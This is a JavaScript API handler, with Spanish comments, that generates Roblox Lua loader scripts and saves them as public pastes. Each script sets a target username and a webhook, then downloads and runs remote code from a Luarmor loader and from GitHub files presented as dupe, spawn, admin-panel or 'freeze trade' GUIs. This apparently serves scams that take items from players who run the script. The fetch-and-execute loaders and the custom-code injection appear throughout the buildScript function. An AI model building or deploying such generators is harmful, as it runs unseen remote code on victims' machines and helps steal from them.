```js
// api/generate.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const {
        username,
        webhook,
        mode,
        brainrots,
        skins,
        gears,
        customCode,
        userId
    } = req.body;

    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    try {
        const script = buildScript(
            username,
            webhook,
            mode,
            brainrots || [],
            skins || [],
            gears || [],
            customCode || ''
        );

        const pasteId = await saveToInternalPaste(
            script,
            `Script para ${username}`,
            userId
        );

        const baseUrl =
            process.env.BASE_URL || 'https://oblivionhub.xyz';

        const rawUrl =
            `${baseUrl}/api/paste?id=${pasteId}&raw=true`;

        return res.status(200).json({
            loadstring:
                `loadstring(game:HttpGet("${rawUrl}"))()`,

            script: script,
            pasteUrl: rawUrl,
            pasteId: pasteId,
            obfuscated: false
        });

    } catch (error) {
        console.error('Error general:', error);

        return res.status(500).json({
            error: error.message
        });
    }
}


// ============================================================
//  CONSTRUIR SCRIPT
// ============================================================
function buildScript(
    username,
    webhook,
    mode,
    brainrots,
    skins,
    gears,
    customCode
) {
    function luaTable(arr, indent = '    ') {
        if (arr.length === 0) return '{}';

        const items = arr.map(
            item =>
                `["${String(item).replace(/"/g, '\\"')}"] = true`
        );

        return (
            '{\n' +
            items.map(s => indent + s).join(',\n') +
            '\n}'
        );
    }

    let script =
        `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;

    script +=
        `getgenv().WEBHOOK_URL = "${webhook
            ? webhook.replace(/"/g, '\\"')
            : 'WEBHOOK_URL'}"\n`;

    script +=
        `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;

    script +=
        `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;

    script +=
        `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;


    // ============================================================
    //  GUI BASE / LUARMOR ACTUAL
    // ============================================================
    const GUI_BASE =
        'https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua';


    // ============================================================
    //  GITHUB ACTUAL DE CADA GUI
    // ============================================================
    const GUI_GITHUB = {
        adminpanel:
            'https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua',

        dupespawn:
            'https://raw.githubusercontent.com/sab-api/GUIDUPE/refs/heads/main/GUIDUPE.lua',

        codesniper:
            'https://raw.githubusercontent.com/sab-api/GUISNIPER/refs/heads/main/Sniper.lua'
    };


    let fullScript = script;


    // ============================================================
    //  NORMAL
    // ============================================================
    if (mode === 'normal') {

        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;
    }


    // ============================================================
    //  CODE SNIPER
    //  LUARMOR + GITHUB
    // ============================================================
    else if (mode === 'codesniper') {

        fullScript += `
-- Cargando GUI SNIPER
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.codesniper}"))()
end)`;
    }


    // ============================================================
    //  DUPE / SPAWN
    //  LUARMOR + GITHUB
    // ============================================================
    else if (mode === 'dupespawn') {

        fullScript += `
-- Cargando GUI DUPE / SPAWN
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

-- Cargando GUIDUPE.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.dupespawn}"))()
end)`;
    }


    // ============================================================
    //  ADMIN PANEL
    //  LUARMOR + GITHUB
    // ============================================================
    else if (mode === 'adminpanel') {

        fullScript += `
-- Cargando GUI AP
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)

-- Cargando GUIAP.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("${GUI_GITHUB.adminpanel}"))()
end)`;
    }


    // ============================================================
    //  FREEZE TRADE
    // ============================================================
    else if (mode === 'freezetrade') {

        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;
    }


    // ============================================================
    //  CUSTOM
    // ============================================================
    else if (mode === 'custom') {

        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("${GUI_BASE}"))()
end)`;

        if (customCode && customCode.trim()) {

            fullScript +=
                `\n\ntask.spawn(function()\n` +
                `    ${customCode
                    .replace(/\r?\n/g, '\n    ')}\n` +
                `end)`;
        }
    }


    return fullScript;
}


// ============================================================
//  GUARDAR EN PASTEFY INTERNO
// ============================================================
async function saveToInternalPaste(
    content,
    title,
    userId
) {
    const baseUrl =
        process.env.BASE_URL || 'https://oblivionhub.xyz';

    const response = await fetch(
        `${baseUrl}/api/paste`,
        {
            method: 'POST',

            headers: {
                'Content-Type': 'application/json'
            },

            body: JSON.stringify({
                content: content,
                title: title || 'Untitled',
                userId: userId || null,
                public: true
            })
        }
    );

    if (!response.ok) {

        const error = await response.json();

        throw new Error(
            error.error ||
            'Error al guardar el paste'
        );
    }

    const data = await response.json();

    return data.id;
}
```
